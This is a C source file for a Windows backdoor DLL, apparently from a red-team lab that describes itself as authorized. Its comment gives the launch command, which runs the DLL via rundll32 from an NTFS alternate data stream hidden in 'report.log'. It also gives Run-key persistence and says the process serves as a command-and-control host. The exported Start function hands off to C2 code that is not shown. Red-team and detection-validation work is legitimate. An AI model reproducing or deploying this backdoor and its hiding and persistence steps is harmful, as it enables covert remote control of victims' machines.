/* backdoor.c - TVeronica lab: Stage 4 persistence payload.
   Authorized red team / detection-validation lab only.
   Run via:  rundll32.exe "report.log:backdoor.dll",Start
   (HKCU Run key set by stage3.ps1). Keeps rundll32 alive as the C2 host. */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "c2core.h"

BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID r) {
    (void)r;
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(h);
    }
    return TRUE;
}

__declspec(dllexport) void CALLBACK Start(HWND h, HINSTANCE i, LPSTR cmd, int show) {
    (void)h; (void)i; (void)cmd; (void)show;
    if (probe_mode("backdoor")) return;
    c2_run("backdoor");
}
